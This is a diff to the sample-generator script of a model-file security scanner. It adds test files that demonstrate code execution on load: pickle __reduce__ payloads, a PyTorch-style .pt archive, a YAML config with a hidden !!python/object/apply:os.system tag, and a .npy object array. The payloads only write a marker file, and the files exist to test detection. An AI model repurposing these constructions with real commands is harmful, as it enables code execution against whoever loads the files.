@@ -5,22 +5,23 @@ make_samples.py - ModelHawk's offensive half.
 Crafts intentionally-malicious (but HARMLESS) model files so you can watch the
 scanner catch a real exploit chain end-to-end.
 
-HOW THE ATTACK WORKS
-    During unpickling, Python calls obj.__reduce__() and then *executes* the
-    (callable, args) tuple it returns. So an object whose __reduce__ returns
-    (os.system, ("...",)) runs that command the instant someone calls
-    torch.load() / pickle.load() on the file.
+ATTACK VECTORS DEMONSTRATED
+  1. Pickle RCE  - __reduce__ trick in .pkl and PyTorch .pt (zip-wrapped)
+  2. Unsafe YAML - !!python/object/apply tag in a realistic-looking config file
+  3. Numpy object array - pickle payload embedded in a .npy with dtype=object
 
-    Building the file does NOT run the payload: pickle.dumps only *records* the
-    (callable, args) tuple - it never invokes the callable. The payload fires
-    only on load. ModelHawk detects it statically, without loading.
+HOW PICKLE RCE WORKS
+    During unpickling, Python calls obj.__reduce__() and *executes* the
+    (callable, args) tuple it returns. Building the file does NOT run the
+    payload — pickle.dumps only *records* it. The payload fires only on load.
+    ModelHawk detects it statically without loading.
 
 HARMLESS BY DESIGN
-    Every payload here only writes a 'PWNED.txt' marker (or echoes text). There
-    is no deletion, persistence, or network activity. Even so:
+    Every payload only writes a 'PWNED.txt' marker (or echoes text). No
+    deletion, persistence, or network activity. Even so:
 
-        DO NOT pickle.load() / torch.load() these files. Scan them:
-            python modelhawk.py samples/
+        DO NOT pickle.load() / torch.load() / yaml.load() / np.load() these.
+        Scan them:   python modelhawk.py samples/
 """
 import json
 import os
@@ -76,6 +77,62 @@ def _safetensors_bytes():
     return struct.pack("<Q", len(hb)) + hb + struct.pack("<f", 0.0)
 
 
+# --------------------------------------------------------------------------- #
+# YAML attack-vector samples
+# --------------------------------------------------------------------------- #
+
+_YAML_PAYLOAD = b"""\
+# Looks like a harmless model configuration
+model_config:
+  architecture: resnet50
+  num_classes: 1000
+  pretrained: true
+  weights_url: https://example.com/weights.pt
+
+# Hidden payload: yaml.load() without SafeLoader executes this
+metadata: !!python/object/apply:os.system
+  - echo You just executed code hidden in a YAML config > PWNED.txt
+"""
+
+_BENIGN_YAML = b"""\
+model_config:
+  architecture: resnet50
+  num_classes: 1000
+  pretrained: true
+training:
+  lr: 0.001
+  epochs: 100
+"""
+
+
+# --------------------------------------------------------------------------- #
+# Numpy object-array attack-vector samples (no numpy dependency)
+# --------------------------------------------------------------------------- #
+
+def _make_npy_bytes(pickle_payload: bytes) -> bytes:
+    """
+    Craft a minimal numpy .npy v1 file with dtype=object.
+    Layout: magic(6) + version(2) + hdr_len(2) + header + pickle_payload.
+    Header padded so (10 + header_len) is a multiple of 64 (numpy spec).
+    """
+    raw = b"{'descr': '|O', 'fortran_order': False, 'shape': (1,), }"
+    # (10 + len(raw) + padding + 1_newline) % 64 == 0
+    remainder = (10 + len(raw) + 1) % 64
+    padding = (64 - remainder) % 64
+    header = raw + b" " * padding + b"\n"
+    return b"\x93NUMPY\x01\x00" + len(header).to_bytes(2, "little") + header + pickle_payload
+
+
+def _make_benign_npy_bytes() -> bytes:
+    """Minimal .npy v1 for a 4-element float32 array (no pickle, safe)."""
+    raw = b"{'descr': '<f4', 'fortran_order': False, 'shape': (4,), }"
+    remainder = (10 + len(raw) + 1) % 64
+    padding = (64 - remainder) % 64
+    header = raw + b" " * padding + b"\n"
+    data = struct.pack("<4f", 1.0, 2.0, 3.0, 4.0)
+    return b"\x93NUMPY\x01\x00" + len(header).to_bytes(2, "little") + header + data
+
+
 def build_samples(out_dir):
     """Write the demo corpus into out_dir. Returns the list of file paths."""
     os.makedirs(out_dir, exist_ok=True)
@@ -84,24 +141,22 @@ def build_samples(out_dir):
     def write(name, data):
         path = os.path.join(out_dir, name)
         with open(path, "wb") as f:
-            f.write(data)
+            f.write(data if isinstance(data, (bytes, bytearray)) else data)
         written.append(path)
         return path
 
     # 1) Benign baseline (protocol 5).
     write("benign_state_dict.pkl", pickle.dumps(_benign_state_dict(), protocol=5))
 
-    # 2) Malicious - emitted at BOTH protocol 2 (inline GLOBAL opcode) and
-    #    protocol 5 (STACK_GLOBAL opcode), so the scanner's two independent
-    #    detection paths are both exercised.
+    # 2) Malicious pickle - both protocol 2 (GLOBAL opcode) and
+    #    protocol 5 (STACK_GLOBAL opcode) to exercise both detection paths.
     for proto in (2, 5):
         write(f"malicious_os_system.p{proto}.pkl",
               pickle.dumps(_ShellPayload(_OS_CMD), protocol=proto))
         write(f"malicious_exec.p{proto}.pkl",
               pickle.dumps(_ExecPayload(_EXEC_CODE), protocol=proto))
 
-    # 3) Malicious payload wrapped in a PyTorch-style zip (.pt): archive/data.pkl
-    #    plus a fake version file and tensor blob, mimicking torch.save() layout.
+    # 3) Malicious payload wrapped in a PyTorch-style zip (.pt).
     pt_path = os.path.join(out_dir, "malicious_pytorch_model.pt")
     payload = pickle.dumps(_ShellPayload(_OS_CMD), protocol=2)
     with zipfile.ZipFile(pt_path, "w") as z:
@@ -110,8 +165,17 @@ def build_samples(out_dir):
         z.writestr("archive/data/0", b"\x00\x00\x00\x00")
     written.append(pt_path)
 
-    # 4) The safe modern format (no code path at all).
+    # 4) Safe modern format (no pickle at all).
     write("safe_model.safetensors", _safetensors_bytes())
+
+    # 5) YAML attack vector: !!python/object/apply tag in a "config" file.
+    write("malicious_config.yaml", _YAML_PAYLOAD)
+    write("benign_config.yaml", _BENIGN_YAML)
+
+    # 6) Numpy object-array attack vector: pickle payload in a .npy file.
+    npy_payload = pickle.dumps(_ShellPayload(_OS_CMD), protocol=3)
+    write("malicious_object_array.npy", _make_npy_bytes(npy_payload))
+    write("benign_float_array.npy", _make_benign_npy_bytes())
 
     return written
 
